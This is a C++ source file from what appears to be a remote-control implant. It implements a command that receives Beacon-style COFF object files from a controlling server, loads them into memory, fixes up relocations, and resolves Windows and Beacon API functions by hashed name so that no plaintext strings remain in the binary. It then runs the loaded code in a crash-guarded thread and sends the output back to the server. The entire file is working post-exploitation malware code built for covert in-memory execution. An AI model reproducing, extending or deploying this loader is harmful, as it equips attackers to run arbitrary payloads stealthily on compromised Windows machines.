#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_EXECUTE_COFF

using namespace stardust;
using namespace starburst;

// COFF structures
#pragma pack(push, 1)
struct COFF_FILE_HEADER {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
};

struct COFF_SECTION {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
};

struct COFF_SYMBOL {
    union {
        char     ShortName[8];
        struct {
            uint32_t Zeroes;
            uint32_t Offset;
        } Name;
    };
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
};

struct COFF_RELOCATION {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
};
#pragma pack(pop)

#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

// TEB.ArbitraryUserPointer at gs:0x28
// Use raw .byte encoding for gs segment access to avoid Intel/AT&T syntax issues
static inline auto declfn coff_set_inst( instance* p ) -> void {
#ifdef _WIN64
    // mov gs:[0x28], rcx  =  65 48 89 0c 25 28 00 00 00
    register void* val __asm__("rcx") = reinterpret_cast<void*>(p);
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
#endif
}

static inline auto declfn coff_get_inst() -> instance* {
#ifdef _WIN64
    // mov rax, gs:[0x28]  =  65 48 8b 04 25 28 00 00 00
    void* result;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(result)
    );
    return static_cast<instance*>(result);
#else
    return nullptr;
#endif
}

// Beacon API implementations
extern "C" {

static void __cdecl declfn beacon_printf( int type, const char* fmt, ... ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );

    char buf[2048];
    int len;

    if ( p_vsnprintf ) {
        va_list args;
        va_start( args, fmt );
        len = p_vsnprintf( buf, sizeof(buf) - 1, fmt, args );
        va_end( args );
        if ( len < 0 ) len = sizeof(buf) - 1;
        buf[len] = '\0';
    } else {
        len = 0;
        auto s = fmt;
        while ( *s && len < (int)sizeof(buf) - 1 ) buf[len++] = *s++;
        buf[len] = '\0';
    }

    auto& coff = inst->coff;
    if ( coff.output_length + (uint32_t)len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, buf, len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

static void __cdecl declfn beacon_output( int type, const char* data, int len ) {
    (void)type;
    auto inst = coff_get_inst();
    if ( !inst || !data || len <= 0 ) return;

    auto& coff = inst->coff;
    if ( coff.output_length + len + 2 > coff.output_capacity ) {
        uint32_t new_cap = coff.output_capacity == 0 ? 4096 : coff.output_capacity;
        while ( new_cap < coff.output_length + (uint32_t)len + 2 ) new_cap *= 2;
        coff.output_data = static_cast<char*>(
            inst->heap_realloc( coff.output_data, new_cap ) );
        coff.output_capacity = new_cap;
    }

    memory::copy( coff.output_data + coff.output_length, const_cast<char*>(data), len );
    coff.output_length += len;
    coff.output_data[coff.output_length] = '\0';
}

struct datap {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_data_parse( datap* dp, char* buf, int size ) {
    dp->original = buf;
    dp->buffer = buf;
    dp->length = size;
    dp->size = size;
}

static int __cdecl declfn beacon_data_int( datap* dp ) {
    if ( dp->length < 4 ) return 0;
    int val = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    return val;
}

static short __cdecl declfn beacon_data_short( datap* dp ) {
    if ( dp->length < 2 ) return 0;
    short val = *reinterpret_cast<short*>( dp->buffer );
    dp->buffer += 2;
    dp->length -= 2;
    return val;
}

static char* __cdecl declfn beacon_data_extract( datap* dp, int* out_len ) {
    if ( dp->length < 4 ) { if ( out_len ) *out_len = 0; return nullptr; }
    int len = *reinterpret_cast<int*>( dp->buffer );
    dp->buffer += 4;
    dp->length -= 4;
    if ( dp->length < len ) { if ( out_len ) *out_len = 0; return nullptr; }
    char* result = dp->buffer;
    dp->buffer += len;
    dp->length -= len;
    if ( out_len ) *out_len = len;
    return result;
}

static int __cdecl declfn beacon_data_length( datap* dp ) {
    return dp->length;
}

struct formatp {
    char*    original;
    char*    buffer;
    int      length;
    int      size;
};

static void __cdecl declfn beacon_format_alloc( formatp* fp, int maxsz ) {
    auto inst = coff_get_inst();
    if ( inst ) {
        fp->original = static_cast<char*>( inst->heap_alloc( maxsz ) );
        fp->buffer = fp->original;
        fp->length = 0;
        fp->size = maxsz;
    }
}

static void __cdecl declfn beacon_format_reset( formatp* fp ) {
    fp->buffer = fp->original;
    fp->length = 0;
}

static void __cdecl declfn beacon_format_free( formatp* fp ) {
    auto inst = coff_get_inst();
    if ( inst && fp->original ) {
        inst->heap_free( fp->original );
        fp->original = nullptr;
        fp->buffer = nullptr;
    }
}

static void __cdecl declfn beacon_format_append( formatp* fp, const char* buf, int len ) {
    if ( fp->length + len <= fp->size ) {
        memory::copy( fp->buffer + fp->length, const_cast<char*>(buf), len );
        fp->length += len;
    }
}

static void __cdecl declfn beacon_format_printf( formatp* fp, const char* fmt, ... ) {
    auto inst = coff_get_inst();
    if ( !inst || !fp || !fmt ) return;

    using vsnprintf_t = int ( __cdecl* )( char*, size_t, const char*, va_list );
    auto p_vsnprintf = reinterpret_cast<vsnprintf_t>(
        resolve::_api( inst->ntdll.handle, expr::hash_string( "_vsnprintf" ) ) );
    if ( !p_vsnprintf ) return;

    int avail = fp->size - fp->length;
    if ( avail <= 0 ) return;

    va_list args;
    va_start( args, fmt );
    int written = p_vsnprintf( fp->buffer + fp->length, avail, fmt, args );
    va_end( args );
    if ( written > 0 ) fp->length += written;
}

static char* __cdecl declfn beacon_format_tostring( formatp* fp, int* size ) {
    if ( size ) *size = fp->length;
    return fp->original;
}

static void __cdecl declfn beacon_format_int( formatp* fp, int val ) {
    beacon_format_append( fp, reinterpret_cast<char*>( &val ), 4 );
}

static BOOL __cdecl declfn beacon_is_admin() {
    return FALSE;
}

static DWORD __cdecl declfn beacon_get_spawn_to( BOOL x86, char* buf, int len ) {
    auto inst = coff_get_inst();
    if ( !inst || !buf || len <= 0 ) return 0;
    const char* src = x86 ? inst->spawnto.x86 : inst->spawnto.x64;
    int i = 0;
    while ( src[i] && i < len - 1 ) { buf[i] = src[i]; i++; }
    buf[i] = '\0';
    return static_cast<DWORD>( i );
}

static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
    (void)ctx;
}

} // extern "C"

// read current thread ID from TEB
static inline auto declfn get_current_tid() -> uint32_t {
#ifdef _WIN64
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x65, 0x8b, 0x04, 0x25, 0x48, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#else
    uint32_t tid;
    __asm__ volatile (
        ".byte 0x64, 0x8b, 0x04, 0x25, 0x24, 0x00, 0x00, 0x00"
        : "=a"(tid)
    );
    return tid;
#endif
}

static auto WINAPI declfn bof_crash_handler(
    EXCEPTION_POINTERS* ep ) -> LONG
{
    auto inst = coff_get_inst();
    if ( !inst || !inst->coff.guard_active )
        return EXCEPTION_CONTINUE_SEARCH;

    if ( get_current_tid() != inst->coff.bof_thread_id )
        return EXCEPTION_CONTINUE_SEARCH;

    inst->coff.crash_code = ep->ExceptionRecord->ExceptionCode;
    inst->coff.guard_active = 0;

#ifdef _WIN64
    ep->ContextRecord->Rcx = ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Rip = inst->coff.exit_thread_addr;
    ep->ContextRecord->Rsp &= ~0xFull;
    ep->ContextRecord->Rsp -= 8;
#else
    ep->ContextRecord->Esp -= 4;
    *reinterpret_cast<uint32_t*>( ep->ContextRecord->Esp ) =
        ep->ExceptionRecord->ExceptionCode;
    ep->ContextRecord->Eip = static_cast<uint32_t>( inst->coff.exit_thread_addr );
#endif

    return EXCEPTION_CONTINUE_EXECUTION;
}

struct bof_run_ctx {
    void*     entry;
    char*     args;
    int       args_len;
    instance* inst;
};

static DWORD WINAPI declfn bof_thread_fn( LPVOID param ) {
    auto ctx = static_cast<bof_run_ctx*>( param );
    coff_set_inst( ctx->inst );
    ctx->inst->coff.bof_thread_id = get_current_tid();
    ctx->inst->coff.guard_active = 1;

    typedef void ( __cdecl *bof_entry )( char*, int );
    auto fn = reinterpret_cast<bof_entry>( ctx->entry );
    fn( ctx->args, ctx->args_len );

    ctx->inst->coff.guard_active = 0;
    return 0;
}

// FNV-1a hash for compile-time beacon API name matching
static constexpr uint32_t _fnv1a( const char* s ) {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn _hash_name( const char* s ) -> uint32_t {
    uint32_t h = 0x811c9dc5;
    while ( *s ) { h ^= (uint8_t)*s++; h *= 0x01000193; }
    return h;
}

static auto declfn resolve_coff_symbol(
    instance& inst, const char* name
) -> void* {
    // match beacon API names by hash - no plaintext strings in binary
    uint32_t h = _hash_name( name );
    switch ( h ) {
        case _fnv1a("BeaconPrintf"):           return (void*)beacon_printf;
        case _fnv1a("BeaconOutput"):           return (void*)beacon_output;
        case _fnv1a("BeaconDataParse"):        return (void*)beacon_data_parse;
        case _fnv1a("BeaconDataInt"):          return (void*)beacon_data_int;
        case _fnv1a("BeaconDataShort"):        return (void*)beacon_data_short;
        case _fnv1a("BeaconDataExtract"):      return (void*)beacon_data_extract;
        case _fnv1a("BeaconDataLength"):       return (void*)beacon_data_length;
        case _fnv1a("BeaconFormatAlloc"):      return (void*)beacon_format_alloc;
        case _fnv1a("BeaconFormatReset"):      return (void*)beacon_format_reset;
        case _fnv1a("BeaconFormatFree"):       return (void*)beacon_format_free;
        case _fnv1a("BeaconFormatAppend"):     return (void*)beacon_format_append;
        case _fnv1a("BeaconFormatPrintf"):     return (void*)beacon_format_printf;
        case _fnv1a("BeaconFormatToString"):   return (void*)beacon_format_tostring;
        case _fnv1a("BeaconFormatInt"):        return (void*)beacon_format_int;
        case _fnv1a("BeaconIsAdmin"):          return (void*)beacon_is_admin;
        case _fnv1a("BeaconGetSpawnTo"):       return (void*)beacon_get_spawn_to;
        case _fnv1a("BeaconCleanupProcess"):   return (void*)beacon_cleanup_thread;
    }

    if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
        return resolve_coff_symbol( inst, name + 6 );
    }

    char mod_name[64] = { 0 };
    char func_name[128] = { 0 };

    const char* dollar = name;
    while ( *dollar && *dollar != '$' ) dollar++;

    if ( *dollar == '$' ) {
        uint32_t mod_len = (uint32_t)(dollar - name);
        if ( mod_len < 59 ) {
            memory::copy( mod_name, const_cast<char*>(name), mod_len );
            mod_name[mod_len] = '.'; mod_name[mod_len+1] = 'd';
            mod_name[mod_len+2] = 'l'; mod_name[mod_len+3] = 'l';
            mod_name[mod_len+4] = '\0';
        }
        uint32_t func_len = str_len( const_cast<char*>( dollar + 1 ) );
        if ( func_len < 127 ) {
            memory::copy( func_name, const_cast<char*>(dollar + 1), func_len );
        }

        auto h_mod = inst.kernel32.LoadLibraryA( mod_name );
        if ( h_mod ) {
            auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
            if ( addr ) return (void*)addr;
        }
    }

    DBG_PRINT( inst, "COFF: unresolved symbol: %s\n", name );
    return nullptr;
}

auto declfn starburst::cmd_execute_coff(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t coff_len = 0;
    auto coff_data = parser_bytes( params, &coff_len );
    uint32_t args_len = 0;
    auto args_data = parser_bytes( params, &args_len );
    uint32_t entry_len = 0;
    auto entry_name = parser_string( params, &entry_len );

    if ( !coff_data || coff_len < sizeof(COFF_FILE_HEADER) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no COFF data" ) ) );
        return;
    }

    char entry_buf[64] = { 0 };
    if ( entry_name && entry_len > 0 ) {
        memory::copy( entry_buf, entry_name, entry_len < 63 ? entry_len : 63 );
    } else {
        entry_buf[0] = 'g'; entry_buf[1] = 'o'; entry_buf[2] = '\0';
    }

    DBG_PRINT( inst, "cmd_execute_coff: %u bytes, entry=%s, args=%u bytes\n",
        coff_len, entry_buf, args_len );

    auto header = reinterpret_cast<COFF_FILE_HEADER*>( coff_data );
    auto sections = reinterpret_cast<COFF_SECTION*>(
        coff_data + sizeof(COFF_FILE_HEADER) + header->SizeOfOptionalHeader );
    auto symbols = reinterpret_cast<COFF_SYMBOL*>(
        coff_data + header->PointerToSymbolTable );
    auto string_table = reinterpret_cast<char*>(
        symbols + header->NumberOfSymbols );

    auto section_ptrs = static_cast<uint8_t**>(
        inst.heap_alloc( header->NumberOfSections * sizeof(uint8_t*) ) );
    if ( !section_ptrs ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    // calculate total size: sections (page-aware aligned) + trampolines + IAT
    // trampolines: 12 bytes each (mov rax,imm64 + jmp rax), one per symbol max
    // IAT must be co-located so REL32 relocations from BOF code can reach it
    //
    // page-align after executable sections so VirtualProtect(RX) on .text
    // does not accidentally make writable sections (.data/.bss) read-only
    uint32_t total_alloc = 0;
    uint32_t sec_offsets[256] = { 0 };
    uint32_t sec_sizes[256] = { 0 };
    for ( uint16_t i = 0; i < header->NumberOfSections && i < 256; i++ ) {
        sec_sizes[i] = sections[i].SizeOfRawData;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = sections[i].VirtualSize;
        if ( sec_sizes[i] == 0 ) sec_sizes[i] = 64;

        if ( i > 0 && ( sections[i - 1].Characteristics & 0x20000000 ) &&
             !( sections[i].Characteristics & 0x20000000 ) ) {
            total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
        }

        sec_offsets[i] = total_alloc;
        total_alloc += ( sec_sizes[i] + 15 ) & ~15u;
    }
    total_alloc = ( total_alloc + 0xFFF ) & ~0xFFFu;
    uint32_t tramp_offset = total_alloc;
    total_alloc += header->NumberOfSymbols * 12;
    uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
    total_alloc = imp_offset + header->NumberOfSymbols * sizeof(void*);

    auto coff_base = static_cast<uint8_t*>(
        inst.kernel32.VirtualAlloc(
            nullptr, total_alloc,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
    if ( !coff_base ) {
        inst.heap_free( section_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "section alloc failed" ) ) );
        return;
    }

    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        section_ptrs[i] = coff_base + sec_offsets[i];
        if ( sections[i].SizeOfRawData > 0 ) {
            memory::copy( section_ptrs[i],
                coff_data + sections[i].PointerToRawData,
                sections[i].SizeOfRawData );
        }
    }

    auto tramp_ptr = coff_base + tramp_offset;
    uint32_t tramp_used = 0;

    auto imp_table = reinterpret_cast<void**>( coff_base + imp_offset );

    auto func_ptrs = static_cast<void**>(
        inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
    if ( !func_ptrs ) {
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    memory::zero( func_ptrs, header->NumberOfSymbols * sizeof(void*) );

    void* entry_ptr = nullptr;

    for ( uint32_t i = 0; i < header->NumberOfSymbols; i++ ) {
        char sym_name[256] = { 0 };
        if ( symbols[i].Name.Zeroes == 0 ) {
            auto long_name = string_table + symbols[i].Name.Offset;
            uint32_t nlen = str_len( long_name );
            memory::copy( sym_name, long_name, nlen < 255 ? nlen : 255 );
        } else {
            memory::copy( sym_name, symbols[i].ShortName, 8 );
        }

        if ( symbols[i].SectionNumber > 0 ) {
            uint16_t sec_idx = symbols[i].SectionNumber - 1;
            func_ptrs[i] = section_ptrs[sec_idx] + symbols[i].Value;

            if ( str_cmp( sym_name, entry_buf ) == 0 ||
                 ( sym_name[0] == '_' && str_cmp( sym_name + 1, entry_buf ) == 0 ) ) {
                entry_ptr = func_ptrs[i];
                DBG_PRINT( inst, "COFF: entry '%s' at %p\n", sym_name, entry_ptr );
            }
        } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
            bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
                          sym_name[2] == 'i' && sym_name[3] == 'm' &&
                          sym_name[4] == 'p' && sym_name[5] == '_';
            void* resolved = resolve_coff_symbol( inst, sym_name );
            DBG_PRINT( inst, "COFF: sym[%u] '%s' imp=%d resolved=%p\n",
                i, sym_name, is_imp ? 1 : 0, resolved );
            if ( is_imp && resolved ) {
                imp_table[i] = resolved;
                func_ptrs[i] = &imp_table[i];
            } else if ( resolved ) {
                // non-__imp_ external: create trampoline (mov rax,addr; jmp rax)
                // so REL32 relocations stay within ±2GB of BOF sections
                auto t = tramp_ptr + tramp_used * 12;
                t[0] = 0x48; t[1] = 0xB8;
                *reinterpret_cast<uint64_t*>( t + 2 ) =
                    reinterpret_cast<uint64_t>( resolved );
                t[10] = 0xFF; t[11] = 0xE0;
                func_ptrs[i] = t;
                tramp_used++;
            } else {
                func_ptrs[i] = nullptr;
            }
        } else {
            func_ptrs[i] = nullptr;
        }

        i += symbols[i].NumberOfAuxSymbols;
    }

    if ( !entry_ptr ) {
        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
        inst.heap_free( section_ptrs );
        inst.heap_free( func_ptrs );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
        return;
    }

    // process relocations
    for ( uint16_t s = 0; s < header->NumberOfSections; s++ ) {
        if ( sections[s].NumberOfRelocations == 0 ) continue;

        auto relocs = reinterpret_cast<COFF_RELOCATION*>(
            coff_data + sections[s].PointerToRelocations );

        for ( uint16_t r = 0; r < sections[s].NumberOfRelocations; r++ ) {
            uint32_t sym_idx = relocs[r].SymbolTableIndex;
            auto target = section_ptrs[s] + relocs[r].VirtualAddress;

            uintptr_t sym_addr = reinterpret_cast<uintptr_t>( func_ptrs[sym_idx] );
            if ( !sym_addr ) continue;

            switch ( relocs[r].Type ) {
                case IMAGE_REL_AMD64_ADDR64:
                    *reinterpret_cast<uint64_t*>( target ) += sym_addr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *reinterpret_cast<uint32_t*>( target ) += static_cast<uint32_t>(
                        sym_addr - reinterpret_cast<uintptr_t>( coff_base ) );
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
                    break;
                case IMAGE_REL_AMD64_REL32_1:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 5 );
                    break;
                case IMAGE_REL_AMD64_REL32_2:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 6 );
                    break;
                case IMAGE_REL_AMD64_REL32_3:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 7 );
                    break;
                case IMAGE_REL_AMD64_REL32_4:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 8 );
                    break;
                case IMAGE_REL_AMD64_REL32_5:
                    *reinterpret_cast<int32_t*>( target ) +=
                        static_cast<int32_t>( sym_addr - reinterpret_cast<uintptr_t>( target ) - 9 );
                    break;
            }
        }
    }

    // set .text sections and trampoline area to RX
    for ( uint16_t i = 0; i < header->NumberOfSections; i++ ) {
        if ( sections[i].Characteristics & 0x20000000 ) {
            DWORD old_protect;
            inst.kernel32.VirtualProtect( section_ptrs[i], sec_sizes[i],
                PAGE_EXECUTE_READ, &old_protect );
        }
    }
    if ( tramp_used > 0 ) {
        DWORD old_protect;
        inst.kernel32.VirtualProtect( tramp_ptr, tramp_used * 12,
            PAGE_EXECUTE_READ, &old_protect );
    }

    // setup COFF output via instance
    inst.coff.output_data = static_cast<char*>( inst.heap_alloc( 4096 ) );
    inst.coff.output_length = 0;
    inst.coff.output_capacity = 4096;
    inst.coff.crash_code = 0;
    inst.coff.guard_active = 0;
    if ( inst.coff.output_data ) inst.coff.output_data[0] = '\0';

    // resolve VEH + ExitThread for crash isolation
    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );

    inst.coff.exit_thread_addr = reinterpret_cast<uintptr_t>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlExitUserThread" ) ) );

    void* veh = nullptr;
    if ( pAddVEH && inst.coff.exit_thread_addr ) {
        veh = pAddVEH( 1,
            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( bof_crash_handler ) );
    }

    DBG_PRINT( inst, "COFF: calling entry at %p, args=%p len=%u veh=%p\n",
        entry_ptr, args_data, args_len, veh );

    bool bof_ok = false;

    bof_run_ctx bctx = { entry_ptr,
        reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };

    HANDLE h_bof = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( bof_thread_fn ),
        &bctx, 0, nullptr );

    if ( h_bof ) {
        DWORD wait = inst.kernel32.WaitForSingleObject( h_bof, 60000 );
        DWORD exit_code = 0;
        inst.kernel32.GetExitCodeThread( h_bof, &exit_code );

        if ( wait == WAIT_TIMEOUT ) {
            inst.kernel32.TerminateThread( h_bof, 1 );
            DBG_PRINT( inst, "COFF: BOF timed out after 60s\n" );
        } else if ( exit_code == 0 ) {
            bof_ok = true;
        } else {
            DBG_PRINT( inst, "COFF: BOF crashed with 0x%08X\n", exit_code );
        }

        inst.kernel32.CloseHandle( h_bof );
    } else {
        instance* old_aup = coff_get_inst();
        coff_set_inst( &inst );

        typedef void ( __cdecl *bof_entry )( char*, int );
        auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
        go_fn( reinterpret_cast<char*>( args_data ), args_len );

        coff_set_inst( old_aup );
        bof_ok = true;
    }

    if ( veh && pRemoveVEH )
        pRemoveVEH( veh );

    DBG_PRINT( inst, "COFF: done ok=%d crash=0x%08X\n", bof_ok, inst.coff.crash_code );

    if ( bof_ok && inst.coff.output_data && inst.coff.output_length > 0 ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, inst.coff.output_data );
    } else if ( bof_ok ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "executed (no output)" ) ) );
    } else if ( inst.coff.crash_code ) {
        char err[32] = { 'B','O','F',' ','c','r','a','s','h',':',' ','0','x' };
        uint32_t code = inst.coff.crash_code;
        for ( int d = 7; d >= 0; d-- ) {
            uint32_t n = ( code >> ( d * 4 ) ) & 0xF;
            err[13 + (7 - d)] = n < 10 ? '0' + n : 'A' + n - 10;
        }
        err[21] = '\0';
        queue_response( inst, task_uuid, RESPONSE_ERROR, err );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "BOF timed out" ) ) );
    }

    if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
    inst.coff = {};

    inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
    inst.heap_free( section_ptrs );
    inst.heap_free( func_ptrs );
}

#endif
